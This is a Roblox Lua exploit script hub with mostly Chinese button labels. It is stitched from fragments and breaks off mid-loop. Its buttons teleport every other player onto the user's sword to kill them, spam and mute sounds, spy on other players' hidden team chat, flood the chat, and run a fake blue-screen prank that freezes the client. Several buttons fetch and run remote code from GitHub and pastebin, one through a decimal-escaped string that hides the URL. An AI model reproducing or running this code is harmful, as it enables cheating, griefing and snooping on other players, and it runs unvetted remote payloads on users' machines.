-- This only works on sword fighting games like Crossroads, Sword Fight on Bridge, and Fencing (如果玩家在黑色垫子上)
-- All you have to do is press the "吸人可攻击" button, and then take out your sword and click to kill everyone, and you're done! :)

-- Objects

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

-- Properties

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(1, 0.388235, 0.368627)
Frame.BorderColor3 = Color3.new(0.67451, 0.211765, 0.152941)
Frame.Position = UDim2.new(0.293040276, 0, 0.491666675, 0)
Frame.Size = UDim2.new(0.106227107, 0, 0.0833333284, 0)
Frame.Active = true
Frame.Draggable = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton.BackgroundTransparency = 0.80000001192093
TextButton.Position = UDim2.new(0.103524067, 0, 0.200333327, 0)
TextButton.Size = UDim2.new(0.793684483, 0, 0.601000011, 0)
TextButton.Font = Enum.Font.SourceSansLight
TextButton.FontSize = Enum.FontSize.Size14
TextButton.Text = "杀死所有人"
TextButton.TextScaled = true
TextButton.TextSize = 14
TextButton.TextWrapped = true

run = false
TextButton.MouseButton1Click:connect(function()
run = not run
local function tp()
for i, player in ipairs(game.Players:GetChildren()) do
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
end
end
end
if run then
while wait() do
if run then
tp()
end
end
end
end)

  	end    

})

Tab:AddButton({

	Name = "车子模型",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexCr4sh/FeScripts/main/FeCarScript.lua", true))()

  	end    

})

Tab:AddButton({

	Name = "电脑键盘",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()

  	end    

})

Tab:AddButton({

	Name = "死亡声音",

	Callback = function()

     --sound thingy

--[[
Made By Scripty#2063
If You Gonna showcase this , make sure to Credit me , do not take that you are owner of the script
This Gui is Undetectable
RespectFilteringEnabled must be false to use it
--]]

local ScreenGui = Instance.new("ScreenGui")
local Draggable = Instance.new("Frame")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Time = Instance.new("TextLabel")
local _1E = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local _3E = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local SE = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Path = Instance.new("TextLabel")
local Top = Instance.new("Frame")
local Top_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Minizum = Instance.new("TextButton")
local Stop = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local IY = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local Wait = Instance.new("TextBox")

--Properties:

ScreenGui.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Draggable.Name = "Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ."
Draggable.Parent = ScreenGui
Draggable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Draggable.BackgroundTransparency = 1.000
Draggable.BorderSizePixel = 0
Draggable.Position = UDim2.new(0.35026139, 0, 0.296158612, 0)
Draggable.Size = UDim2.new(0, 438, 0, 277)

Frame.Name = ". . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame.Parent = Draggable
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.00133678317, 0, -0.00348037481, 0)
Frame.Size = UDim2.new(0, 438, 0, 277)

Frame_2.Name = " . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-0.00133678142, 0, -0.0179207586, 0)
Frame_2.Size = UDim2.new(0, 438, 0, 238)
Frame_2.Active = true
Frame_2.Draggable = true

Time.Name = "Time"
Time.Parent = Frame_2
Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Time.BackgroundTransparency = 1.000
Time.Position = UDim2.new(0, 0, 0.0126050422, 0)
Time.Size = UDim2.new(0, 437, 0, 31)
Time.Font = Enum.Font.GothamSemibold
Time.Text = "RespectFilteringEnabled(RFE) : nil"
Time.TextColor3 = Color3.fromRGB(255, 255, 255)
Time.TextScaled = true
Time.TextSize = 14.000
Time.TextWrapped = true

_1E.Name = "1E"
_1E.Parent = Frame_2
_1E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_1E.BorderSizePixel = 0
_1E.Position = UDim2.new(0.0182648394, 0, 0.676470578, 0)
_1E.Size = UDim2.new(0, 208, 0, 33)
_1E.Font = Enum.Font.SourceSans
_1E.Text = "Mute Game"
_1E.TextColor3 = Color3.fromRGB(255, 255, 255)
_1E.TextScaled = true
_1E.TextSize = 30.000
_1E.TextWrapped = true

UICorner.Parent = _1E

_3E.Name = "3E"
_3E.Parent = Frame_2
_3E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_3E.BorderSizePixel = 0
_3E.Position = UDim2.new(0.0159817357, 0, 0.142857149, 0)
_3E.Size = UDim2.new(0, 209, 0, 33)
_3E.Font = Enum.Font.SourceSans
_3E.Text = "Annoying  Sound"
_3E.TextColor3 = Color3.fromRGB(255, 255, 255)
_3E.TextSize = 30.000
_3E.TextWrapped = true

UICorner_2.Parent = _3E

SE.Name = "SE"
SE.Parent = Frame_2
SE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SE.BorderSizePixel = 0
SE.Position = UDim2.new(0.509132445, 0, 0.142857149, 0)
SE.Size = UDim2.new(0, 209, 0, 33)
SE.Font = Enum.Font.SourceSans
SE.Text = "Kill Sound Service"
SE.TextColor3 = Color3.fromRGB(255, 255, 255)
SE.TextSize = 30.000
SE.TextWrapped = true

UICorner_3.Parent = SE

Path.Name = "Path"
Path.Parent = Frame_2
Path.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Path.BackgroundTransparency = 1.000
Path.Position = UDim2.new(0.00684931502, 0, 0.815126061, 0)
Path.Size = UDim2.new(0, 435, 0, 44)
Path.Font = Enum.Font.GothamSemibold
Path.Text = "Dev Note : This Script is FE and it only FE when RespectFilteringEnabled(RFE) is disabled , elseif RespectFilteringEnabled(RFE) is true then it only be client , mostly RespectFilteringEnabled(RFE) disabled game are classic game"
Path.TextColor3 = Color3.fromRGB(255, 0, 0)
Path.TextScaled = true
Path.TextSize = 14.000
Path.TextWrapped = true

Top.Name = "Top"
Top.Parent = Frame_2
Top.BackgroundColor3 = Color3.fromRGB(41, 60, 157)
Top.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top.BorderSizePixel = 0
Top.Position = UDim2.new(-0.00133678142, 0, -0.128059402, 0)
Top.Size = UDim2.new(0, 438, 0, 30)
Top_2.Name = "Top"
Top_2.Parent = Top
Top_2.BackgroundColor3 = Color3.fromRGB(30, 45, 118)
Top_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top_2.BorderSizePixel = 0
Top_2.Position = UDim2.new(0, 0, 0.967638671, 0)
Top_2.Size = UDim2.new(0, 438, 0, 5)

ImageLabel.Parent = Top
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0, 0, 0.0666666701, 0)
ImageLabel.Size = UDim2.new(0, 29, 0, 27)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8798286232"

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.997245014, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 397, 0, 30)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "FEAG"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = Top
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.924657524, 0, 0, 0)
Exit.Size = UDim2.new(0, 32, 0, 25)
Exit.Font = Enum.Font.GothamSemibold
Exit.Text = "x"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Minizum.Name = "Minizum"
Minizum.Parent = Top
Minizum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minizum.BackgroundTransparency = 1.000
Minizum.Position = UDim2.new(0.851598203, 0, 0, 0)
Minizum.Size = UDim2.new(0, 32, 0, 23)
Minizum.Font = Enum.Font.GothamSemibold
Minizum.Text = "_"
Minizum.TextColor3 = Color3.fromRGB(255, 255, 255)
Minizum.TextScaled = true
Minizum.TextSize = 14.000
Minizum.TextWrapped = true

Stop.Name = "Stop"
Stop.Parent = Frame_2
Stop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Stop.BorderSizePixel = 0
Stop.Position = UDim2.new(0.0182648394, 0, 0.310924381, 0)
Stop.Size = UDim2.new(0, 424, 0, 33)
Stop.Font = Enum.Font.SourceSans
Stop.Text = "Stop"
Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
Stop.TextSize = 30.000
Stop.TextWrapped = true

UICorner_4.Parent = Stop

IY.Name = "IY"
IY.Parent = Frame_2
IY.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0.509132445, 0, 0.676470578, 0)
IY.Size = UDim2.new(0, 209, 0, 33)
IY.Font = Enum.Font.SourceSans
IY.Text = "Unmute Game"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 30.000
IY.TextWrapped = true

UICorner_5.Parent = IY

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0182648394, 0, 0.466386557, 0)
TextLabel_2.Size = UDim2.new(0, 426, 0, 50)
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "Wait Speed       :"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

Wait.Name = "Wait()"
Wait.Parent = Frame_2
Wait.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Wait.BackgroundTransparency = 1.000
Wait.Position = UDim2.new(0.531963468, 0, 0.466386557, 0)
Wait.Size = UDim2.new(0, 199, 0, 50)
Wait.ZIndex = 99999
Wait.ClearTextOnFocus = false
Wait.Font = Enum.Font.GothamSemibold
Wait.Text = "0.5"
Wait.TextColor3 = Color3.fromRGB(255, 255, 255)
Wait.TextSize = 30.000
Wait.TextWrapped = true

--Sound Service:
local notification = Instance.new("Sound")
notification.Parent = game:GetService("SoundService")
notification.SoundId = "rbxassetid://9086208751"
notification.Volume = 5
notification.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"

--funuction:
Exit.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)
local Mute = false
IY.MouseButton1Click:Connect(function()
	Mute = false
end)

_1E.MouseButton1Click:Connect(function()
	Mute = true
	while Mute == true do 
		wait()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Stop()
			end
		end
	end
end)

_3E.MouseButton1Click:Connect(function()
	for _, sound in next, workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound:Play()
		end
	end
end)

local Active = true
SE.MouseButton1Click:Connect(function()
	Active = true
	while Active == true do
		local StringValue = Wait.Text
		wait(StringValue)
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Play()
			end
		end
	end
end)

Stop.MouseButton1Click:Connect(function()
	Active = false
end)
--Credit:
notification:Play()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "FEAG";
	Text = "FEAG Has Been Loaded , Made By Scripty#2063 (gamer14_123)";
	Icon = "";
	Duration = 10; 
	Button1 = "Yes Sir";
})
--Check:
while true do
	wait(0.5)
	local setting = game:GetService("SoundService").RespectFilteringEnabled
	if setting == true then
		Time.TextColor = BrickColor.new(255,0,0)
		Time.Text ="RespectFilteringEnabled(RFE) : true"
	elseif setting == false then
		Time.Text ="RespectFilteringEnabled(RFE) : false"
		Time.TextColor = BrickColor.new(0,255,0)
	end
end

  	end    

})

Tab:AddButton({

	Name = "物品漂浮（J飘/K回来）",

	Callback = function()

     local options = {
	CaptureAtMagnitude = 5,
    	EquipToolOnCapture = true,
    	ToolFloatBackSpeed = 500,
    	ToolFloatBackResponsiveness = 20,
    
    	HotKeys = {
		Release = Enum.KeyCode.J,
        	Capture = Enum.KeyCode.K
	}
}



local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")


local PLAYER = Players.LocalPlayer
local CHARACTER = PLAYER.Character or PLAYER.CharacterAdded:Wait()
local BACKPACK = PLAYER.Backpack
local HUMANOID_ROOT_PART = CHARACTER:WaitForChild("HumanoidRootPart")


local vA = {}



local function FolderToolParts(pA)
	local tvA = Instance.new("Folder")
    	tvA.Parent = pA

    	for lvA, lvB in next, pA:GetChildren() do
        	if lvB:IsA("BasePart") then
            		lvB.Parent = tvA
        	end
    	end
	
	return tvA
end

local function FindFirstTool()
	for lvA, lvB in next, CHARACTER:GetDescendants() do
        	if lvB:IsA("Tool") and lvB:FindFirstChildOfClass("Part") then
            		return lvB
        	end
	end
	
	for lvA, lvB in next, BACKPACK:GetDescendants() do
        	if lvB:IsA("Tool") and lvB:FindFirstChildOfClass("Part") then
            		return lvB
        	end
    	end


    	return nil
end

local function Release(pA)
	local tvA = FolderToolParts(pA)


    	if #tvA:GetChildren() > 0 then
        	for lvA, lvB in next, tvA:GetDescendants() do
            		if lvB:IsA("BasePart") then
                		lvB.CanCollide = true

                		local tvB = Instance.new("BodyForce")
                		tvB.Force = Vector3.new(0, lvB:GetMass() * workspace.Gravity, 0)
                		tvB.Parent = lvB
            		end
        	end

        	tvA.Parent = workspace
		
        	table.insert(vA, {tvA, pA})
	end
end

local function Capture(pA)
	if pA and pA[1] and pA[2] then
        	local tvA = pA[1]:GetChildren()


        	for lvA, lvB in next, tvA do
			lvB.CanCollide = false
        	end


        	local tvB = Instance.new("Attachment")
        	tvB.Parent = tvA[1]


        	local tvC = Instance.new("Attachment")
        	tvC.Position = Vector3.new(0, 0, -4)
        	tvC.Parent = HUMANOID_ROOT_PART


        	local tvD = Instance.new("AlignPosition")
        	tvD.RigidityEnabled = false
        	tvD.Responsiveness = options.ToolFloatBackResponsiveness
        	tvD.MaxVelocity = options.ToolFloatBackSpeed
        	tvD.MaxForce = options.ToolFloatBackSpeed

        	tvD.Attachment0 = tvB
        	tvD.Attachment1 = tvC
        	tvD.Parent = tvA[1]


        	repeat
			wait()
		until (tvA[1].Position - HUMANOID_ROOT_PART.Position).Magnitude < options.CaptureAtMagnitude


        	for lvA, lvB in next, pA[1]:GetChildren() do
            		local tvE = lvB:FindFirstChildOfClass("BodyForce")
            
            		if tvE then
                		tvE:Destroy()
            		end

            		lvB.Parent = pA[2]
        	end


        	tvB:Destroy()
        	tvC:Destroy()
        	tvD:Destroy()


        	pA[1]:Destroy()
        	pA[2].Parent = options.EquipToolOnCapture and CHARACTER or BACKPACK


        	return true
	end
	
	return false
end



UserInputService.InputBegan:Connect(function(pA, pB)
	if pB == false and pA.UserInputType == Enum.UserInputType.Keyboard then
        	if pA.KeyCode == options.HotKeys.Release then
            		local tvA = FindFirstTool()

			if tvA then
				if tvA.Parent ~= CHARACTER then
					tvA.Parent = CHARACTER
					wait(0.5)
				end

				Release(tvA)
			end
		elseif pA.KeyCode == options.HotKeys.Capture then
            		if #vA > 0 and Capture(vA[#vA]) then
                		table.remove(vA, #vA)
            		end
        	end
	end
end)



settings().Physics.AllowSleep = false
sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius", math.huge)

  	end    

})

Tab:AddButton({

	Name = "人体分离术",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/%E5%B7%A5%E4%BD%9C%E5%AE%A4.LUA", true))()

  	end    

})

Tab:AddButton({

	Name = "去除迷雾",

	Callback = function()

      if state then
        game.Lighting.FogStart = 3276634343
        game.Lighting.FogEnd = 3276734343
    else
        game.Lighting.FogStart = 0
    end

  	end    

})

Tab:AddButton({

	Name = "部位消失",

	Callback = function()

     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()

  	end    

})

Tab:AddButton({

	Name = "服装修改（黑客）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/6X72Mdfs"))()

  	end    

})

Tab:AddButton({

	Name = "时间控制器（仅自己）",

	Callback = function()

     loadstring("\115\101\116\116\105\110\103\32\61\32\115\101\116\116\105\110\103\115\40\41\46\78\101\116\119\111\114\107\10\108\111\99\97\108\32\69\102\102\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\10\69\102\102\101\99\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\76\105\103\104\116\105\110\103\10\69\102\102\101\99\116\46\83\97\116\117\114\97\116\105\111\110\32\61\32\45\51\10\69\102\102\101\99\116\46\66\114\105\103\104\116\110\101\115\115\32\61\32\48\10\69\102\102\101\99\116\46\67\111\110\116\114\97\115\116\32\61\32\48\10\10\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\108\111\111\100\98\97\108\108\47\45\98\97\99\107\45\117\112\115\45\102\111\114\45\108\105\98\115\47\109\97\105\110\47\119\97\108\108\37\50\48\118\51\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\83\116\111\112\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\99\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\67\108\111\99\107\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\68\101\115\116\114\111\121\32\71\117\105\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\82\101\109\111\118\101\32\89\111\117\114\32\71\117\105\44\101\116\99\41\10\10\10\98\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\98\58\66\117\116\116\111\110\40\34\83\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\9\9\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\51\48\48\48\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\42\32\51\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\85\110\115\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\54\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\32\32\32\32\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\48\10\9\9\10\101\110\100\41\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\10\10\99\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\99\58\66\111\120\40\34\67\108\111\99\107\32\84\105\109\101\34\44\34\110\117\109\98\101\114\34\44\102\117\110\99\116\105\111\110\40\118\97\108\117\101\41\32\45\45\32\34\110\117\109\98\101\114\34\32\111\114\32\34\115\116\114\105\110\103\34\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\67\108\111\99\107\84\105\109\101\32\61\32\118\97\108\117\101\10\101\110\100\41\10")()

  	end    

})

Tab:AddButton({

	Name = "蓝屏警告",

	Callback = function()

     local coregui = game:service'CoreGui'

local sound = Instance.new('Sound', coregui)
sound.SoundId = 'rbxassetid://865599816'
sound.Volume = 3
sound.Looped = true

local gui = Instance.new('ScreenGui', coregui)
local image = Instance.new('ImageLabel', gui)
image.Position = UDim2.new(0, 0, -0.05, 0)
image.Size = UDim2.new(1, 0, 1.05, 0)
image.Image = "rbxassetid://9637192164"
image.Visible = false

task.wait(1)

for i,v in pairs(coregui:GetChildren()) do
    if v ~= gui and v ~= sound then
        v:Destroy()   
    end
end

if (not UserSettings().GameSettings:InFullScreen()) then
    game:service'GuiService':ToggleFullscreen()    
end

game:service'UserInputService'.MouseIconEnabled = false
sound:Play()
image.Visible = true

task.wait(1)

while true do end

  	end    

})

Tab:AddButton({

	Name = "聊天崩溃",

	Callback = function()

     while true do
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
wait()
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
wait()
end

  	end    

})

Tab:AddButton({

	Name = "聊天间谍",

	Callback = function()

     --[[
	Simple Chat Spy
	Type "spy" to enable or disable the chat spy.
	Only tested if this works executed with Synapse (should work with other exploits though)
--]]

print("-- Chat Spy Executed --")
print("Type \"spy\" to enable or disable the chat spy.")
print("Only tested if this works executed with Synapse (should work with other exploits though)")
print("https://github.com/dehoisted/Chat-Spy")

-- Config
Config = {
	enabled = true,
	spyOnMyself = true,
	public = false,
	publicItalics = true
}

-- Customizing Log Output
PrivateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}

	local StarterGui = game:GetService("StarterGui")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
	local instance = (_G.chatSpyInstance or 0) + 1
	_G.chatSpyInstance = instance

	local function onChatted(p,msg)
		if _G.chatSpyInstance == instance then
			if p==player and msg:lower():sub(1,4)=="/spy" then
				Config.enabled = not Config.enabled
				wait(0.3)
				PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
			elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
				local hidden = true
				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
						hidden = false
					end
				end)
				wait(1)
				conn:Disconnect()
				if hidden and Config.enabled then
					if Config.public then
						saymsg:FireServer((Config.publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
					else
						PrivateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
						StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
					end
				end
			end
		end
	end
	
	for _,p in ipairs(Players:GetPlayers()) do
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end

	Players.PlayerAdded:Connect(function(p)
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end)

	PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
	StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
	local chatFrame = player.PlayerGui.Chat.Frame
	chatFrame.ChatChannelParentFrame.Visible = true
	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

  	end    

})

Tab:AddButton({

	Name = "轰炸聊天",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/%E8%BD%B0%E7%82%B8.lua"))()

  	end    

})

Tab:AddButton({

	Name = "聊天过滤",

	Callback = function()

     amount_of_msgs = 7
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("                  ", "All")
end

  	end    

})

Tab:AddButton({

	Name = "刷聊天数",

	Callback = function()

     while true do
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(0.75)
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(0.75)
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
